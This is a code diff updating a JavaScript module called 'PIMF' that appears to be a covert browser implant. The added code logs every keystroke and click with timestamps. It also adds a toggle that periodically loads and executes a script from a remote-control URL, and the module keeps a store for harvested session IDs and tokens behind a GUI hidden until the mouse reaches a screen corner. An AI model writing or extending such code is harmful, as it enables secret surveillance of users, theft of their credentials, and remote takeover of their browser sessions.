@@ -13,7 +13,7 @@ const Q = ( function(){
 
     const
         api_name = "PIMF",
-        version  = "1.08";
+        version  = "1.09";
 
 
     function request( url, method, headers, body=false ){
@@ -101,6 +101,9 @@ const Q = ( function(){
         checkbox.addEventListener( "change", callback );
         return wrap;
     }
+    function unix_time_now(){
+        return Math.round( new Date().getTime() / 1000 );
+    }
     function init(){
         style.innerHTML = css;
         document.body.appendChild( link );
@@ -141,18 +144,37 @@ const Q = ( function(){
                 } ),
             get_checkbox( "log",
                 function (){
-                    if ( !this.checked ){
-                        //TODO
-                    } else {
-                        //TODO
-                    }
+                    window.addEventListener( "click", (e)=>{
+                        Q.data.log.events.clicks.push( {
+                            time:   unix_time_now(),
+                            target: e.target.nodeName
+                        } );
+                    } );
+                    window.addEventListener( "keydown", (e)=>{
+                        let t = unix_time_now(),
+                            k = e.key;
+                        if ( e.key == "Enter" ) k = "ENTER";
+                        Q.data.log.events.keys.push( {
+                            time:   unix_time_now(),
+                            key:    k,
+                            target: e.target.nodeName
+                        } );
+                    } );
+                    this.disabled = true;
                 } ),
             get_checkbox( "RC",
                 function (){
                     if ( !this.checked ){
-                        //TODO
+                        if ( rc !== null ){
+                            clearInterval( rc );
+                            rc = null;
+                        }
                     } else {
-                        //TODO
+                        if ( rc === null ){
+                            rc = setInterval( ()=>{
+                                load_script( url_rctrl );
+                            }, sync_rate );
+                        }
                     }
                 } )
         ];
@@ -351,37 +373,27 @@ const Q = ( function(){
     border-radius:      5px;
 }`;
 
-    let locker = null;
+    let locker = null,
+        rc     = null;
 
 
     init();
 
     window.addEventListener( "mousemove", (e)=>{
-        if (e.clientX<5&&e.clientY<5){
+        if ( e.clientX + e.clientY < 10 ){
             Q.gui.show();
         }
     } );
-
-    window.addEventListener( "keydown", (e)=>{
-        if ( e.key == "Enter" ){
-            Q.data.log.keys += "\n";
-        } else {
-            if ( e.key.length == 1 ){
-                Q.data.log.keys += e.key;
-            }
-        }
-    } );
-
-    setInterval( ()=>{
-        if ( url_rctrl ) load_script( url_rctrl );
-    }, sync_rate );
 
 
     return {
 
         data: {
             log: {
-                keys: "",
+                events: {
+                    clicks: [],
+                    keys: []
+                },
                 credentials: {
                     session_ids: [],
                     tokens: []
